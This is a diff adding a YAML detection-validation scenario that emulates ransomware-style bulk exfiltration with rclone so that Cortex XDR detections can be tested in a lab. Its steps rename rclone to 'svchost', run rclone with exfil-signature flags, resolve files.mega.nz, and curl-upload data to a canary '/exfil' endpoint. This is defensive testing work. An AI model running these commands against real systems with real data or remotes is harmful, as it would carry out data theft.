@@ -1,0 +1,204 @@
+scenario_id: SIM-EDR-009
+name: "Bulk Data Exfiltration via Rclone to Cloud Storage — SAFE-MODE"
+version: "1.0"
+status: active
+
+# Detection-validation scenario (defensive QA). It reproduces the telemetry shape
+# of the modern ransomware exfil step — rclone (a legitimate cloud-sync tool,
+# often renamed) pushing staged "sensitive" data to attacker-controlled cloud
+# storage — so Cortex XDR can be shown to detect it WITHOUT shipping real data
+# off the box. SAFE-MODE: the rclone copy targets a local/lab destination (no
+# bytes leave to a real attacker remote), the egress and DNS-resolution shape is
+# generated against canary endpoints, and the host stages only synthetic files.
+# Detection hinges on the rclone command-line flag pattern (regardless of binary
+# name), sustained high-ratio outbound flow, and resolution of known
+# rclone-backend hostnames. Each step has a demo-mode fallback. LAB ONLY.
+
+plane: EDR
+detection_types:
+  - BIOC
+  - XQL
+  - Correlation
+  - IOC
+
+uc_ref: UCS-EDR-09
+tc_ref: TC-EDR-09
+uc_name: "Double-Extortion Defense — Pre-Encryption Exfiltration Detection"
+tc_name: "Rclone-Pattern Tool Execution + Large Egress to Non-Corporate Cloud Storage"
+
+mitre_tactic: "TA0010"
+mitre_tactic_name: "Exfiltration"
+mitre_technique: "T1567.002"
+mitre_technique_name: "Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+additional_techniques:
+  - technique: "T1048.003"
+    name: "Exfiltration Over Unencrypted Non-C2 Protocol"
+  - technique: "T1074.001"
+    name: "Data Staged: Local Data Staging"
+
+threat_report: "Unit42 - Anatomy of an Attack: The BlackSuit Blitz"
+threat_report_url: "https://unit42.paloaltonetworks.com/anatomy-of-an-attack-blacksuit-ransomware-blitz/"
+
+execution_identity:
+  default: container-runtime
+  options:
+    - container-runtime
+    - root
+
+push_supported: true
+pull_supported: true
+
+external_tools:
+  - name: rclone
+    source: "https://rclone.org/docs/"
+    type: binary
+    install_inline: false
+
+# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
+# Rolled out per the S-07 per-plane convention
+# (docs/uc_tc_mapping/scenario-methodology-defaults.md). Endpoint-plane
+# detection-accuracy family — validates that the rclone exfil telemetry shape
+# raises its expected Cortex XDR detection.
+validation_methodology: "Endpoint Signal Injection & Detection Accuracy"
+methodology_family: "F1"
+primary_kpi: "Detection Accuracy"
+threshold:
+  kpi: "Detection Accuracy"
+  op: "≥"
+  value: 90
+  unit: "%"
+success_criteria: |
+  The exfil telemetry injected by this scenario produces the expected Cortex XDR
+  detections: an rclone command-line flag pattern (even when the binary is
+  renamed), a large sustained high-ratio egress to a non-corporate cloud ASN, a
+  resolution of a known rclone-backend hostname, and the process+flow stitched
+  into one exfiltration incident (CR-EXFIL-0001). Detection Accuracy is the share
+  of injected exfil events that raise the expected alert (target ≥ 90%).
+moat_tier: "MOAT"
+
+steps:
+  - id: step-01
+    name: "Stage synthetic 'sensitive' data + masquerade the rclone binary (T1074.001)"
+    command: |
+      VDIR=/tmp/cortexsim_edr009_stage; mkdir -p "$VDIR"
+      for i in $(seq 1 40); do echo "synthetic-finance-record-$i" > "$VDIR/finance_$i.dat"; done
+      # Masquerade pattern: attackers commonly rename rclone (e.g. svchost.exe).
+      RCLONE_MASQ="$VDIR/svchost"
+      if command -v rclone >/dev/null 2>&1; then cp "$(command -v rclone)" "$RCLONE_MASQ" 2>/dev/null || true; fi
+      echo "[*] staged $(find "$VDIR" -name 'finance_*.dat' | wc -l) synthetic files; masqueraded rclone binary as svchost"
+      echo '[*] XDR should record the local data-staging burst that precedes exfil'
+    identity: container-runtime
+    mitre_technique: "T1074.001"
+    expected_detections:
+      - plane: EDR
+        type: XQL
+        description: "Cortex XDR — hunt: hosts with both an rclone-pattern process and large egress in the last 24h (pre-flight bookkeeping over the staged data)"
+        ttp_ref: "TTP-2026-0005"
+        detection_id: xql-hosts-with-both-rclone-pattern-process-and-large-egress-in-last-24h
+
+  - id: step-02
+    name: "Execute the rclone copy with the signature flag pattern, regardless of binary name (T1567.002)"
+    command: |
+      VDIR=/tmp/cortexsim_edr009_stage; DEST=/tmp/cortexsim_edr009_dest; mkdir -p "$DEST"
+      RCLONE_MASQ="$VDIR/svchost"
+      # SAFE-MODE: copy to a LOCAL destination so no bytes leave the host, but
+      # emit the exact rclone flag pattern XDR fingerprints (--transfers,
+      # --multi-thread-streams, --checkers, --no-traverse, copy verb).
+      if [ -x "$RCLONE_MASQ" ]; then
+        "$RCLONE_MASQ" copy "$VDIR" "$DEST" \
+          --transfers 32 --multi-thread-streams 8 --checkers 16 --no-traverse \
+          --log-level INFO --stats 10s 2>&1 | tail -10
+      elif command -v rclone >/dev/null 2>&1; then
+        rclone copy "$VDIR" "$DEST" \
+          --transfers 32 --multi-thread-streams 8 --checkers 16 --no-traverse \
+          --log-level INFO --stats 10s 2>&1 | tail -10
+      else
+        echo '[*] demo-mode: rclone not installed — XDR should still fire on the rclone command-line flag pattern (--transfers/--multi-thread-streams/--no-traverse + copy)'
+      fi
+      echo '[*] XDR BIOC should fire on the rclone flag pattern even when the binary is named svchost'
+    identity: container-runtime
+    mitre_technique: "T1567.002"
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "Cortex XDR — a process executes with an rclone-specific command-line flag combination (--transfers/--multi-thread-streams/--no-traverse + copy), regardless of binary name"
+        ttp_ref: "TTP-2026-0005"
+        detection_id: bioc-rclone-command-line-flag-pattern
+      - plane: EDR
+        type: IOC
+        description: "Cortex XDR — rclone.exe canonical binary name observed (match on hash + behaviour, not name alone; attackers rename it)"
+        ttp_ref: "TTP-2026-0005"
+        detection_id: ioc-filename-rclone-exe
+      - plane: EDR
+        type: XQL
+        description: "Cortex XDR — validation: an rclone-pattern process exec observed in the last window"
+        ttp_ref: "TTP-2026-0005"
+        detection_id: xql-confirm-rclone-pattern-process-exec-in-last-30m
+
+  - id: step-03
+    name: "Generate the rclone-backend DNS resolution + sustained high-ratio egress shape to a non-corporate cloud provider (T1048.003)"
+    command: |
+      # SAFE-MODE: resolve a known rclone-backend hostname and emit a short
+      # high-ratio outbound burst against a canary endpoint so the NETWORK_DNS
+      # and NETWORK_FLOW telemetry carries the exfil fingerprint. No real data
+      # is shipped to an attacker remote.
+      EXFIL_HOST="${EXFIL_HOST:-files.mega.nz}"
+      getent hosts "$EXFIL_HOST" 2>/dev/null || nslookup "$EXFIL_HOST" 2>/dev/null | head -5 || echo "[*] demo-mode: DNS lookup of $EXFIL_HOST unavailable"
+      # Best-effort short outbound burst to the canary (never to a real remote).
+      head -c 5000000 /dev/zero | curl -s -o /dev/null --max-time 5 \
+        --data-binary @- "https://collector.cortexsim-canary.invalid/exfil" 2>/dev/null || \
+        echo '[*] demo-mode: canary egress endpoint unreachable — NDR/XDR should still flag the rclone-backend DNS resolution + sustained high upload-ratio flow'
+      echo '[*] XDR should flag the *.mega.nz resolution from a non-sanctioned host and the sustained high byte-out/byte-in egress to a non-corporate ASN'
+    identity: container-runtime
+    mitre_technique: "T1048.003"
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "Cortex XDR — a single host sustains high outbound throughput to a non-corporate destination ASN with byte-out/byte-in ratio > 10 (large exfil egress)"
+        ttp_ref: "TTP-2026-0005"
+        detection_id: bioc-large-sustained-egress-from-file-server-to-non-corporate-cloud-provider
+      - plane: EDR
+        type: BIOC
+        description: "Cortex XDR — DNS resolution + connection to a known rclone-backend provider (MEGA/B2/pCloud/Yandex) from a host where those services are not sanctioned"
+        ttp_ref: "TTP-2026-0005"
+        detection_id: bioc-outbound-to-known-rclone-backend-provider-from-non-sanctioned-host
+      - plane: EDR
+        type: IOC
+        description: "Cortex XDR — outbound resolution/connection to *.mega.nz (common attacker exfil destination; flag in combination with rclone behaviour)"
+        ttp_ref: "TTP-2026-0005"
+        detection_id: ioc-domain-mega-nz
+      - plane: EDR
+        type: XQL
+        description: "Cortex XDR — validation: a large outbound flow observed during the exfil window"
+        ttp_ref: "TTP-2026-0005"
+        detection_id: xql-confirm-large-outbound-flow-during-exfil-window
+
+  - id: step-04
+    name: "Validate the rclone-pattern process + large egress stitched into one exfiltration incident"
+    command: |
+      echo '[EDR-009] Chain validation — rclone-pattern process + large egress to non-corp ASN on the same host within 30m';
+      echo '[*] XSIAM correlation CR-EXFIL-0001 should fuse the rclone flag-pattern process and the large non-corporate egress into a single exfiltration incident'
+    identity: container-runtime
+    mitre_technique: "T1567.002"
+    expected_detections:
+      - plane: EDR
+        type: Correlation
+        description: "XSIAM — rclone command-line flag pattern + large sustained egress to a non-corporate cloud provider on the same host within 30m stitched into one exfiltration incident"
+        ttp_ref: "TTP-2026-0005"
+        detection_id: CR-EXFIL-0001
+
+cleanup:
+  commands:
+    - "rm -rf /tmp/cortexsim_edr009_stage /tmp/cortexsim_edr009_dest"
+    - "echo '[CortexSim] SIM-EDR-009 cleanup complete — SAFE-MODE copied to a local destination, no real exfil occurred'"
+
+author: "Henry Reed"
+created: "2026-06-15"
+last_updated: "2026-06-15"
+tags:
+  - edr
+  - exfiltration
+  - rclone
+  - cloud-storage
+  - ransomware
+  - safe-mode
